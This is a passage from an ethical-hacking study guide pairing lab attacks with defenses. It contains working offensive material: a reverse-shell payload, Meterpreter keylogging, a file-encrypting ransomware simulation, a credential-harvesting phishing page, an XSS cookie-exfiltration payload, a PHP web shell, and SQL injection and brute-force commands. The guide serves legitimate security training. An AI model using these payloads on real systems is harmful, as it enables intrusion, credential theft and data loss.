# Cybersecurity Comprehensive Study Guide

## https://youtu.be/OjmdFMPxPXs

### Offensive & Defensive Techniques — Ethical Hacking Edition

> **Legal Notice:** Every technique in this guide is to be practiced **only** on systems you own, have written permission to test, or dedicated lab environments (VMs, intentionally vulnerable machines). Never use these techniques on systems you do not own or have explicit authorization for.

---

## Table of Contents

1. [Lab Environment Setup](#1-lab-environment-setup)
2. [Virtualization & Lab Architecture](#2-virtualization--lab-architecture)
3. [Malware Analysis & Classification](#3-malware-analysis--classification)
4. [Remote Access Tools (RATs) & Trojans — Offensive + Defensive](#4-remote-access-tools-rats--trojans--offensive--defensive)
5. [Ransomware — How It Works & How to Defend](#5-ransomware--how-it-works--how-to-defend)
6. [Antivirus Evasion & Detection — Both Sides](#6-antivirus-evasion--detection--both-sides)
7. [Phishing — Creating Test Campaigns & Defending](#7-phishing--creating-test-campaigns--defending)
8. [Web Application Hacking — Your Own Sites](#8-web-application-hacking--your-own-sites)
9. [Network Security & Traffic Analysis](#9-network-security--traffic-analysis)
10. [Social Engineering — Awareness & Defense](#10-social-engineering--awareness--defense)
11. [Identity & Anonymity — VPN, Proxy, Tor, VPS](#11-identity--anonymity--vpn-proxy-tor-vps)
12. [Email Security — SMTP, SPF, DKIM, Phishing Defense](#12-email-security--smtp-spf-dkim-phishing-defense)
13. [Malware Forensics — Detecting & Removing Infections](#13-malware-forensics--detecting--removing-infections)
14. [Exploitation Basics — Metasploit on Lab Machines](#14-exploitation-basics--metasploit-on-lab-machines)
15. [Incident Response Framework](#15-incident-response-framework)
16. [Recommended Learning Path & Resources](#16-recommended-learning-path--resources)

---

## 1. Lab Environment Setup

### 1.1 Why a Dedicated Lab?

A controlled lab is the foundation of safe cybersecurity practice. It lets you:

- Run malware without affecting real systems
- Practice exploits legally
- Simulate real-world attack/defense scenarios
- Snapshot and restore VM states instantly

### 1.2 Host Machine Requirements

| Component | Minimum                 | Recommended      |
| --------- | ----------------------- | ---------------- |
| CPU       | i5 (4 cores)            | i7/i9 (8+ cores) |
| RAM       | 8 GB                    | 16–32 GB         |
| Storage   | 256 GB SSD              | 500 GB+ SSD      |
| OS        | Windows 10/11 or Ubuntu | Either           |

### 1.3 Virtualization Software Options

| Software                      | Cost              | Best For                       |
| ----------------------------- | ----------------- | ------------------------------ |
| **VMware Workstation Pro**    | Paid (free trial) | Best performance, snapshots    |
| **VirtualBox**                | Free              | Beginner-friendly, open source |
| **VMware Workstation Player** | Free (personal)   | Basic VM use                   |
| **Proxmox VE**                | Free              | Advanced home lab server       |

**Installation (VirtualBox — recommended for beginners):**

```bash
# Download from https://www.virtualbox.org/
# Ubuntu/Debian install:
sudo apt install virtualbox virtualbox-ext-pack
```

### 1.4 Essential VMs for Your Lab

```
Your Lab Network (NAT / Host-Only)
├── Kali Linux 2024        ← Attacker machine
├── Metasploitable2         ← Intentionally vulnerable Linux target
├── DVWA (Docker/VM)        ← Vulnerable web app
├── Windows 10 (licensed)   ← Windows target for testing
└── Your own web apps       ← Your created websites for testing
```

### 1.5 Setting Up VM Networking Modes

| Mode                 | Description                   | Use Case                        |
| -------------------- | ----------------------------- | ------------------------------- |
| **NAT**              | VMs share host internet       | Default, VMs can reach internet |
| **Host-Only**        | Isolated network, no internet | Safe malware/exploit practice   |
| **Bridged**          | VM appears on real LAN        | Advanced network testing        |
| **Internal Network** | VMs talk only to each other   | Fully isolated lab              |

**Best practice:** Use **Host-Only** for attack/defense exercises so no traffic escapes your lab.

### 1.6 Recommended VirtualBox Lab Setup

```bash
# Create Host-Only network in VirtualBox
# File → Host Network Manager → Create
# Set IP: 192.168.56.1/24

# Assign all lab VMs to Host-Only adapter
# Each VM gets an IP in 192.168.56.x range
```

### 1.7 Essential VMs — Download Links

- **Kali Linux:** https://www.kali.org/get-kali/
- **Metasploitable2:** https://sourceforge.net/projects/metasploitable/
- **DVWA:** https://github.com/digininja/DVWA
- **VulnHub (many targets):** https://www.vulnhub.com/
- **HackTheBox Labs:** https://www.hackthebox.com/

---

## 2. Virtualization & Lab Architecture

### 2.1 VM Snapshots — Critical Skill

Snapshots save the exact state of a VM. Take one **before** every exercise.

```
VirtualBox Snapshot Workflow:
1. Set up clean VM
2. Machine → Take Snapshot → "Clean State"
3. Run exercise / install malware / break things
4. Machine → Restore Snapshot → Back to clean
```

**Why this matters:** You can test ransomware, trojans, and exploits knowing you can restore in 30 seconds.

### 2.2 Shared Folders (VMware Tools / VirtualBox Guest Additions)

Install Guest Additions to enable:

- Drag-and-drop files between host and VM
- Shared clipboard
- Better screen resolution
- Shared folder access

```bash
# VirtualBox Guest Additions on Ubuntu guest:
sudo apt update
sudo apt install virtualbox-guest-additions-iso
# Then: Devices → Insert Guest Additions CD → run installer
```

### 2.3 Lab Isolation Best Practices

```
DO:
✓ Use Host-Only networking for sensitive exercises
✓ Take snapshots before every test
✓ Keep malware samples inside VMs only
✓ Use separate VMs for attacker/victim roles

DON'T:
✗ Run malware on your host machine
✗ Use Bridged networking for exploit exercises
✗ Share malware samples without password-protected zips
✗ Test on production or internet-facing systems
```

---

## 3. Malware Analysis & Classification

### 3.1 Types of Malware

Understanding malware types is fundamental to defending against them.

| Type           | Primary Goal                 | How It Spreads          | Detection Difficulty |
| -------------- | ---------------------------- | ----------------------- | -------------------- |
| **Virus**      | Damage/delete files          | Infects other files     | Medium               |
| **Trojan**     | Remote access / data theft   | Social engineering      | High                 |
| **Ransomware** | Extort money                 | Email, exploits         | Medium-High          |
| **Worm**       | Self-propagation, congestion | Network vulnerabilities | Low-Medium           |
| **Adware**     | Force advertisements         | Bundled with software   | Low                  |
| **Spyware**    | Surveillance                 | Drive-by downloads      | High                 |
| **Rootkit**    | Persistent hidden access     | Exploits, physical      | Very High            |
| **Keylogger**  | Capture keystrokes           | Trojan payload          | High                 |
| **Botnet**     | DDoS, spam, mining           | Exploit kits            | Medium               |

### 3.2 Malware Lifecycle

```
1. DELIVERY      → Email attachment, malicious link, USB, exploit
2. EXECUTION     → User runs file, or exploit fires automatically
3. PERSISTENCE   → Registry keys, startup folder, scheduled tasks
4. C2 CALLBACK   → Malware connects back to attacker server
5. ACTIONS       → Keylogging, file theft, ransomware encryption
6. EXFILTRATION  → Data sent out to attacker
```

### 3.3 How Antivirus Detects Malware

Antivirus uses multiple detection methods:

**Signature-Based Detection:**

```
File → Hash calculated (MD5/SHA256) → Compared to signature DB
If match found → DETECTED
```

**Heuristic Analysis:**

```
File behavior analyzed → Looks for suspicious patterns
(writing to registry, spawning processes, network callbacks)
```

**Behavioral Detection (Sandboxing):**

```
File executed in isolated environment
Actions monitored → Flagged if malicious behavior observed
```

**Practical Exercise — Hash a File:**

```bash
# Linux/Kali:
md5sum suspicious_file.exe
sha256sum suspicious_file.exe

# Windows PowerShell:
Get-FileHash file.exe -Algorithm SHA256
Get-FileHash file.exe -Algorithm MD5
```

### 3.4 Safe Malware Analysis Tools

For analyzing real malware samples safely:

| Tool                | Purpose                    | Where                        |
| ------------------- | -------------------------- | ---------------------------- |
| **Any.run**         | Interactive sandbox        | https://any.run/             |
| **VirusTotal**      | Multi-AV scanner           | https://virustotal.com/      |
| **Hybrid Analysis** | Sandbox + AV               | https://hybrid-analysis.com/ |
| **Cuckoo Sandbox**  | Self-hosted sandbox        | https://cuckoosandbox.org/   |
| **PEStudio**        | Static PE analysis         | Free download                |
| **Strings**         | Extract text from binaries | Built into Kali              |

**Important:** VirusTotal shares uploaded files with AV companies. Use it for analysis, not for testing your own tools.

---

## 4. Remote Access Tools (RATs) & Trojans — Offensive + Defensive

### 4.1 What Is a RAT?

A Remote Access Tool (RAT) allows remote control of a system. Legitimate examples:

- TeamViewer, AnyDesk, Remote Desktop (RDP) — legal, consensual
- Malicious RATs — installed without consent = illegal

### 4.2 How RATs Work (Technical Architecture)

```
[ATTACKER SERVER]          [VICTIM]
     ┌──────────┐          ┌──────────┐
     │  RAT C2  │◄─────────│ RAT Agent│
     │  Server  │  Reverse │ (payload)│
     │  :4444   │  TCP     │          │
     └──────────┘          └──────────┘
         │                      │
    Commands sent          Actions executed
    (keylog, screen,       (captures, sends
     file access)          data back)
```

**Reverse TCP vs Bind TCP:**

- **Reverse:** Victim connects OUT to attacker (bypasses NAT/firewall)
- **Bind:** Attacker connects IN to victim (needs open port on victim)

Reverse TCP is preferred by attackers because victims are usually behind NAT.

### 4.3 Legal RAT Testing — Metasploit on Metasploitable2

This is the legal, educational equivalent — testing on your own intentionally vulnerable machine.

**Setup:**

```bash
# Kali Linux (attacker): 192.168.56.101
# Metasploitable2 (target): 192.168.56.102

# On Kali — start Metasploit:
msfconsole

# Generate a test payload (for YOUR OWN VM only):
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 LPORT=4444 \
  -f elf -o test_payload.elf

# Set up listener:
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
run
```

**On your Metasploitable2 target (your own VM):**

```bash
chmod +x test_payload.elf
./test_payload.elf
```

**What you can practice in Meterpreter (on your own VM):**

```bash
# After session opens:
sysinfo                  # System information
getuid                   # Current user
ps                       # Running processes
screenshot               # Take screenshot
keyscan_start            # Start keylogger
keyscan_dump             # View captured keys
keyscan_stop             # Stop keylogger
download /etc/passwd     # Download file
upload test.txt /tmp/    # Upload file
shell                    # Drop to shell
```

### 4.4 Persistence Mechanisms — How Malware Survives Reboot

Understanding persistence helps you detect and remove malware.

**Windows Persistence Locations:**

```
Registry Run Keys:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

Startup Folders:
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

Scheduled Tasks:
schtasks /query /fo LIST /v

Services:
sc query type= all state= all
```

**Linux Persistence Locations:**

```bash
# Crontabs:
crontab -l
cat /etc/crontab
ls /etc/cron.*

# Init scripts:
ls /etc/init.d/
systemctl list-units --type=service

# .bashrc / .profile:
cat ~/.bashrc
cat ~/.profile
```

### 4.5 Defensive — Detecting RATs on Your System

```bash
# Windows: Check established connections
netstat -ano | findstr ESTABLISHED

# Find process by PID (from netstat output):
tasklist | findstr <PID>

# Linux equivalent:
ss -tunap | grep ESTABLISHED
netstat -tunap

# Check for unusual outbound connections:
# Unexpected IP addresses connecting out = red flag
```

**Tools for detection:**

```
Sysinternals Suite (Windows — free from Microsoft):
- Process Explorer    → See all processes + their network connections
- TCPView             → Live network connections with process names
- Autoruns            → Everything that starts at boot
- Process Monitor     → Real-time process/file/registry activity
```

**TCPView — how to use:**

```
Download: https://docs.microsoft.com/en-us/sysinternals/
Run as Administrator
Look for:
- Unknown processes with ESTABLISHED connections
- Connections to foreign IPs on unusual ports
- Processes connecting from Temp folders
```

### 4.6 RAT Defense — Practical Hardening

```
1. APPLICATION WHITELISTING
   Windows: Use AppLocker or Windows Defender Application Control
   Block execution from: %TEMP%, %APPDATA%, Downloads

2. NETWORK MONITORING
   Set up IDS (Snort/Suricata) to detect C2 callbacks
   Block outbound connections on non-standard ports

3. BEHAVIORAL MONITORING
   Deploy EDR (Endpoint Detection & Response) solutions
   Open-source: Wazuh, OSSEC

4. USER TRAINING
   Most RATs require user to execute a file
   Train users not to run unsolicited attachments

5. LEAST PRIVILEGE
   Run daily tasks as standard user, not administrator
   RATs inherit the privileges of the executing user
```

---

## 5. Ransomware — How It Works & How to Defend

### 5.1 Ransomware Encryption Mechanism

```
ENCRYPTION FLOW:
1. Ransomware generates random symmetric key (AES-256)
2. Scans filesystem for target extensions (.docx, .pdf, .jpg, etc.)
3. Encrypts each file with AES key
4. Encrypts the AES key with attacker's RSA public key
5. Deletes original files (sometimes overwrites)
6. Displays ransom note

DECRYPTION FLOW (victim side):
1. Victim pays → receives RSA private key
2. RSA private key decrypts AES key
3. AES key decrypts files
```

**Why victims can't decrypt without paying:**
RSA-2048/4096 is computationally infeasible to break. Without the private key, decryption is impossible in any practical timeframe.

### 5.2 Simulating Ransomware Behavior (Lab Exercise — Your VM Only)

This Python script demonstrates the concept safely on a test directory you create:

```python
# EDUCATIONAL SIMULATION ONLY — run on your own VM test folder
# File: ransomware_sim.py

import os
from cryptography.fernet import Fernet

def encrypt_test_directory(directory, key):
    """Encrypt files in test directory — simulation only"""
    f = Fernet(key)
    encrypted_files = []

    for root, dirs, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)

            # Read original
            with open(filepath, 'rb') as file:
                original = file.read()

            # Encrypt
            encrypted = f.encrypt(original)

            # Write encrypted version
            with open(filepath + '.encrypted', 'wb') as file:
                file.write(encrypted)

            # Remove original (in real ransomware)
            os.remove(filepath)
            encrypted_files.append(filepath)

    return encrypted_files

def decrypt_test_directory(directory, key):
    """Decrypt — simulating having the key"""
    f = Fernet(key)

    for root, dirs, files in os.walk(directory):
        for filename in files:
            if filename.endswith('.encrypted'):
                filepath = os.path.join(root, filename)

                with open(filepath, 'rb') as file:
                    encrypted = file.read()

                decrypted = f.decrypt(encrypted)
                original_path = filepath[:-len('.encrypted')]

                with open(original_path, 'wb') as file:
                    file.write(decrypted)

                os.remove(filepath)

# Usage — on your test directory ONLY:
# key = Fernet.generate_key()
# encrypt_test_directory('/tmp/test_folder', key)
# decrypt_test_directory('/tmp/test_folder', key)
```

**Setup for safe exercise:**

```bash
# Create a disposable test directory with fake files:
mkdir /tmp/ransomware_test
echo "fake document 1" > /tmp/ransomware_test/doc1.txt
echo "fake document 2" > /tmp/ransomware_test/doc2.txt
echo "fake spreadsheet" > /tmp/ransomware_test/sheet.csv
pip install cryptography
python3 ransomware_sim.py
```

### 5.3 Ransomware Defense — Comprehensive Strategy

```
PREVENTION LAYER:
├── Regular backups (3-2-1 rule)
│   ├── 3 copies of data
│   ├── 2 different media types
│   └── 1 offsite (air-gapped preferred)
│
├── Email filtering (block .exe, .js, .vbs attachments)
├── Disable macros in Office (Group Policy)
├── Patch management (many ransomwares exploit known vulns)
└── Network segmentation (limit lateral movement)

DETECTION LAYER:
├── File integrity monitoring (Wazuh, Tripwire)
├── Honeypot files (canary files in key directories)
├── Monitor for mass file renames (*.encrypted)
└── Behavioral detection (EDR solutions)

RESPONSE LAYER:
├── Isolate infected system immediately (unplug network)
├── Preserve memory dump for forensics
├── Restore from clean backup
└── Report to authorities (ransomware is a crime)
```

**Canary File Script (Early Warning):**

```python
# Place decoy files and alert if modified
import os
import hashlib
import time

CANARY_PATH = "C:/Users/Public/important_financial_data.xlsx"

def get_hash(filepath):
    with open(filepath, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()

# Create canary
with open(CANARY_PATH, 'w') as f:
    f.write("This is a canary file")

original_hash = get_hash(CANARY_PATH)

while True:
    time.sleep(60)
    try:
        current_hash = get_hash(CANARY_PATH)
        if current_hash != original_hash:
            # ALERT — file was modified!
            print("ALERT: Canary file modified — possible ransomware!")
            # Send email/SMS alert here
    except FileNotFoundError:
        print("ALERT: Canary file deleted — possible ransomware!")
```

---

## 6. Antivirus Evasion & Detection — Both Sides

### 6.1 How AV Detects Threats (Deep Dive)

**Static Analysis:**

```
1. File hash → matched against known malware database
2. String analysis → suspicious strings (.exe, registry keys, C2 IPs)
3. PE header analysis → import table, sections, entropy
4. YARA rules → pattern matching rules
```

**Dynamic Analysis:**

```
1. Sandbox execution → observe behavior
2. API call monitoring → CreateRemoteThread, VirtualAllocEx = suspicious
3. Network behavior → unexpected outbound connections
4. File system changes → mass writes/renames
```

**High-Entropy Detection:**
Encrypted/compressed files have high entropy (randomness). AV flags high-entropy executables.

```python
# Calculate file entropy:
import math
from collections import Counter

def calculate_entropy(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()

    if not data:
        return 0

    counter = Counter(data)
    length = len(data)
    entropy = -sum(
        (count/length) * math.log2(count/length)
        for count in counter.values()
    )
    return entropy

# Max entropy = 8.0 (fully random/encrypted)
# Normal executables: 4.5–6.5
# Packed/encrypted: 7.0–8.0
```

### 6.2 Testing Your Own Tools Against AV (Legal — Your Files Only)

```bash
# Scan a file you created yourself:
# Windows Defender:
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File C:\path\to\yourfile.exe

# On Kali — scan with ClamAV:
sudo apt install clamav
sudo freshclam  # Update signatures
clamscan -r /path/to/test/
```

**Online Scanners (use only for your own files):**

- https://www.virustotal.com/ — shares with AV companies
- https://www.hybrid-analysis.com/ — sandboxed behavior analysis
- https://app.any.run/ — interactive sandbox

### 6.3 Writing YARA Rules — AV Defense Skill

YARA rules are how defenders detect malware patterns:

```yara
// Example YARA rule — detect suspicious strings
rule Suspicious_RAT_Indicators {
    meta:
        description = "Detects common RAT strings"
        author = "Your Name"
        date = "2024-01-01"

    strings:
        $s1 = "keylogger" nocase
        $s2 = "RemoteDesktop" nocase
        $s3 = "GetAsyncKeyState" nocase
        $s4 = "CreateRemoteThread" nocase
        $s5 = "VirtualAllocEx" nocase
        $network = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4,5}/

    condition:
        3 of ($s*) or $network
}
```

```bash
# Install and run YARA:
sudo apt install yara
yara your_rule.yar /path/to/scan/
```

---

## 7. Phishing — Creating Test Campaigns & Defending

### 7.1 Phishing Types

| Type                 | Target             | Example                     |
| -------------------- | ------------------ | --------------------------- |
| **Generic Phishing** | Mass audience      | "Your PayPal is suspended"  |
| **Spear Phishing**   | Specific person    | Impersonating their boss    |
| **Whaling**          | C-level executives | Targeting CEO/CFO           |
| **Vishing**          | Voice/phone        | "This is Microsoft support" |
| **Smishing**         | SMS                | "Your package is held"      |
| **Clone Phishing**   | Copy of real email | Modified legitimate email   |

### 7.2 Setting Up a Legal Phishing Test — Your Own Organization

Use **GoPhish** — open source phishing framework for security awareness testing.

```bash
# Install GoPhish on Kali:
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish
# Access admin panel: https://localhost:3333
# Default creds: admin/gophish
```

**GoPhish Workflow:**

```
1. Create Sending Profile (SMTP config)
2. Create Email Template (phishing email)
3. Create Landing Page (fake login page)
4. Create User Group (targets — your own org with permission)
5. Launch Campaign
6. View Results Dashboard (who clicked, who submitted creds)
```

### 7.3 Building a Phishing Page (Your Own Web Apps — Legal)

Since you're a software engineer with your own websites, here's how to create a test phishing page for security awareness training on your own systems:

**Simple PHP Credential Capture (on your own server):**

```php
<?php
// credential_capture.php
// ONLY deploy on YOUR OWN server for security testing with permission

$log_file = 'captured_creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Log to file
    $log_entry = "[{$time}] IP: {$ip} | User: {$username} | Pass: {$password} | UA: {$user_agent}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    // Redirect to real site (transparent redirect)
    header('Location: https://your-real-site.com/login');
    exit();
}
?>
<!DOCTYPE html>
<html>
<head><title>Login — Security Test</title></head>
<body>
    <!-- This mimics your own login page for testing -->
    <form method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

**View captured credentials:**

```bash
cat captured_creds.txt
```

### 7.4 Email Header Analysis — Detecting Phishing

Real-world skill: analyzing suspicious email headers.

```
From: security@paypal-verify.com  ← Not really PayPal
To: victim@gmail.com
Return-Path: bounce@spamserver.ru  ← Red flag
X-Originating-IP: 185.220.101.45  ← Check on AbuseIPDB
Authentication-Results:
  spf=fail (sender IP is 185.220.101.45)  ← SPF check failed
  dkim=none  ← No DKIM signature
  dmarc=fail  ← DMARC failed

ALL THREE FAILING = almost certainly phishing
```

**Tools for header analysis:**

- https://mxtoolbox.com/EmailHeaders.aspx
- https://toolbox.googleapps.com/apps/messageheader/
- `mail-header-analyzer` on Kali

### 7.5 Phishing Defense — Technical Controls

```bash
# SPF Record (add to your domain DNS):
v=spf1 include:_spf.google.com ~all

# DKIM — generate keys:
sudo apt install opendkim opendkim-tools
opendkim-genkey -t -s mail -d yourdomain.com

# DMARC Record:
v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com

# Check your domain's email security:
# https://mxtoolbox.com/dmarc/
```

**User Training Points:**

```
Phishing red flags to teach users:
1. Urgency language ("Act now!", "Your account will be closed")
2. Mismatched URLs (hover before clicking)
3. Generic greetings ("Dear Customer")
4. Request for credentials via email
5. Unexpected attachments
6. Slightly wrong domain names (paypa1.com, micros0ft.com)
```

---

## 8. Web Application Hacking — Your Own Sites

Since you're a software engineer, this section is most relevant for you. Test these on **DVWA** and your own applications.

### 8.1 DVWA Setup

```bash
# Using Docker:
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Or install on your Kali VM directly:
sudo apt install dvwa
sudo dvwa-start

# Access: http://localhost/dvwa
# Default: admin/password
# Set Security Level: Low (start), Medium, High
```

### 8.2 SQL Injection (SQLi)

**How it works:**

```
Normal query: SELECT * FROM users WHERE username='john' AND password='pass'
Injected:     SELECT * FROM users WHERE username='admin'--' AND password=''
Result:       Logs in as admin without password (-- comments out the rest)
```

**Testing on DVWA — SQLi Lab:**

```
URL: http://localhost/dvwa/vulnerabilities/sqli/
Input: ' OR '1'='1
Input: ' OR '1'='1'--
Input: 1' ORDER BY 3--+   (find number of columns)
Input: 1' UNION SELECT null,table_name FROM information_schema.tables--+
```

**SQLMap — automated SQLi testing (on your own apps only):**

```bash
# Install:
sudo apt install sqlmap

# Test your own website:
sqlmap -u "http://your-own-site.com/page.php?id=1" --dbs
sqlmap -u "http://your-own-site.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://your-own-site.com/page.php?id=1" -D database_name -T users --dump

# With cookies (authenticated):
sqlmap -u "http://your-site.com/page.php?id=1" \
  --cookie="PHPSESSID=your_session_id" \
  --dbs
```

**Defense — Prepared Statements:**

```php
// VULNERABLE:
$query = "SELECT * FROM users WHERE username='$username'";

// SECURE — Prepared Statement:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

// Also: Input validation
$username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
```

### 8.3 Cross-Site Scripting (XSS)

**Types:**

- **Reflected:** Script in URL parameter, reflected in response
- **Stored:** Script saved in database, executed for all visitors
- **DOM-based:** Script modifies DOM without server involvement

**Testing on DVWA:**

```
DVWA XSS Reflected: http://localhost/dvwa/vulnerabilities/xss_r/
Input: <script>alert('XSS')</script>
Input: <img src=x onerror=alert('XSS')>
Input: <svg onload=alert(1)>

DVWA XSS Stored: http://localhost/dvwa/vulnerabilities/xss_s/
Same payloads stored in database, trigger for every visitor
```

**Cookie theft via XSS (on your own site for testing):**

```javascript
// Payload injected into vulnerable input:
<script>
  fetch('http://your-attacker-vm.com/steal?cookie=' + document.cookie)
</script>

// Listener on attacker VM (Kali):
python3 -m http.server 80
# Watch incoming requests with stolen cookies
```

**Defense:**

```php
// Output encoding — always encode before displaying user input:
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// Content Security Policy header:
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// HTTPOnly cookies (prevent JS access):
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

### 8.4 File Upload Vulnerabilities

**Testing on DVWA:**

```
DVWA File Upload: http://localhost/dvwa/vulnerabilities/upload/

Low security — upload PHP web shell:
Create file: shell.php
Content: <?php system($_GET['cmd']); ?>
Upload it → access at: http://localhost/dvwa/hackable/uploads/shell.php?cmd=id
```

**Defense:**

```php
// Validate file type properly:
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime_type, $allowed_types)) {
    die('Invalid file type');
}

// Rename uploaded files (never use original name):
$new_filename = bin2hex(random_bytes(16)) . '.jpg';

// Store outside web root or block PHP execution:
// .htaccess in uploads folder:
// php_flag engine off
// Options -ExecCGI
// AddHandler cgi-script .php .pl .py .jsp
```

### 8.5 Authentication Testing

**Common vulnerabilities to test on your own apps:**

```
1. Brute Force:
   Hydra against your own login:
   hydra -l admin -P /usr/share/wordlists/rockyou.txt \
     http-post-form "http://your-site.com/login:username=^USER^&password=^PASS^:Invalid"

2. Default Credentials:
   admin/admin, admin/password, root/root

3. Insecure Password Reset:
   - Predictable tokens
   - Token not expiring
   - User enumeration via different responses

4. Session Fixation:
   - Does session ID change after login?
   - Are sessions invalidated on logout?
```

**Defense:**

```php
// Regenerate session ID after login:
session_start();
// ... validate credentials ...
session_regenerate_id(true);  // Prevent session fixation

// Rate limiting (add to login handler):
$attempts_key = 'login_attempts_' . $_SERVER['REMOTE_ADDR'];
$attempts = $_SESSION[$attempts_key] ?? 0;
if ($attempts >= 5) {
    die('Too many attempts. Try again in 15 minutes.');
}

// Secure password hashing:
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
if (password_verify($input_password, $hash)) {
    // Login success
}
```

### 8.6 OWASP Top 10 — Full Testing Checklist

| #   | Vulnerability             | Test Tool              | Defense                 |
| --- | ------------------------- | ---------------------- | ----------------------- |
| A01 | Broken Access Control     | Manual testing, Burp   | Proper auth checks      |
| A02 | Cryptographic Failures    | SSLyze, testssl.sh     | TLS 1.3, strong ciphers |
| A03 | Injection (SQLi, XSS)     | SQLmap, XSSer          | Parameterized queries   |
| A04 | Insecure Design           | Threat modeling        | Security by design      |
| A05 | Security Misconfiguration | Nikto, Nessus          | Hardening guides        |
| A06 | Vulnerable Components     | OWASP Dependency-Check | Keep deps updated       |
| A07 | Authentication Failures   | Hydra, Burp Intruder   | MFA, rate limiting      |
| A08 | Integrity Failures        | Manual review          | Signed packages, SAST   |
| A09 | Logging Failures          | Manual review          | Centralized logging     |
| A10 | SSRF                      | Manual, Burp           | Allowlist outbound      |

**Burp Suite — essential web testing tool:**

```bash
# Kali comes with Burp Community Edition
burpsuite &

# Setup browser proxy: 127.0.0.1:8080
# Import Burp CA cert into browser
# Now intercept and modify all requests
```

---

## 9. Network Security & Traffic Analysis

### 9.1 Network Scanning with Nmap

Nmap is the standard tool for network reconnaissance. Run only on **your own network/VMs**.

```bash
# Basic host discovery:
nmap -sn 192.168.56.0/24

# Port scan:
nmap -sV -sC -p- 192.168.56.102

# OS detection:
nmap -O 192.168.56.102

# Aggressive scan (all detection):
nmap -A 192.168.56.102

# Scan your own web server specifically:
nmap -sV -p 80,443,8080,8443 192.168.56.102

# Output to file:
nmap -A 192.168.56.102 -oN scan_results.txt
nmap -A 192.168.56.102 -oX scan_results.xml
```

### 9.2 Wireshark — Traffic Analysis

```bash
# Install:
sudo apt install wireshark

# Capture on interface:
sudo wireshark &
# Select your lab network interface (e.g., vboxnet0)

# Useful filters:
http                           # HTTP traffic only
http.request.method == "POST"  # POST requests (login forms!)
tcp.port == 4444               # Metasploit default port
ip.addr == 192.168.56.102      # Traffic to/from specific host
dns                            # DNS queries
ftp                            # FTP (cleartext protocol)
```

**Exercise — Capture cleartext credentials:**

```bash
# In your lab, make an HTTP (not HTTPS) request to DVWA
# Capture in Wireshark
# Filter: http.request.method == "POST"
# Right-click → Follow → HTTP Stream
# See username and password in cleartext — this is why HTTPS matters!
```

### 9.3 Netstat — Monitoring Connections

```bash
# Windows:
netstat -ano               # All connections with PIDs
netstat -b                 # Show process names (run as admin)

# Linux:
ss -tunap                  # Modern replacement for netstat
netstat -tunap             # All TCP/UDP with process names

# Find what's connecting out:
ss -tunap | grep ESTABLISHED

# Check listening ports:
ss -tlnp                   # What's accepting connections
```

### 9.4 Network Defense — Firewall Configuration

```bash
# Linux UFW (simple firewall):
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp        # SSH
sudo ufw allow 80/tcp        # HTTP
sudo ufw allow 443/tcp       # HTTPS
sudo ufw status verbose

# Block an IP:
sudo ufw deny from 192.168.56.200

# iptables (advanced):
# Block outbound connection to specific IP:
sudo iptables -A OUTPUT -d 185.220.101.45 -j DROP

# Save rules:
sudo iptables-save > /etc/iptables/rules.v4
```

### 9.5 Setting Up IDS with Snort

```bash
# Install Snort on your lab network:
sudo apt install snort

# Basic configuration:
sudo nano /etc/snort/snort.conf
# Set your network: var HOME_NET 192.168.56.0/24

# Write a custom rule (detect port scans):
echo 'alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan"; flags:S; threshold:type threshold, track by_src, count 20, seconds 3; sid:1000001; rev:1;)' \
  >> /etc/snort/rules/local.rules

# Run Snort:
sudo snort -A console -i vboxnet0 -c /etc/snort/snort.conf

# Now run nmap against your lab from Kali — watch Snort alert!
```

---

## 10. Social Engineering — Awareness & Defense

### 10.1 Social Engineering Techniques (Awareness)

Understanding these helps you train users and build defenses.

| Technique        | How It Works                           | Defense                                 |
| ---------------- | -------------------------------------- | --------------------------------------- |
| **Pretexting**   | Creates false scenario ("I'm from IT") | Verify identities, call-back procedures |
| **Phishing**     | Fake emails with malicious links       | Email filtering, user training          |
| **Baiting**      | USB drops, free software               | Block USB auto-run, software policies   |
| **Tailgating**   | Following someone through secure door  | Physical security, badge policies       |
| **Quid Pro Quo** | Offer help in exchange for info        | Security awareness training             |
| **Vishing**      | Phone-based deception                  | Never give info over unsolicited calls  |

### 10.2 Security Awareness Training Program

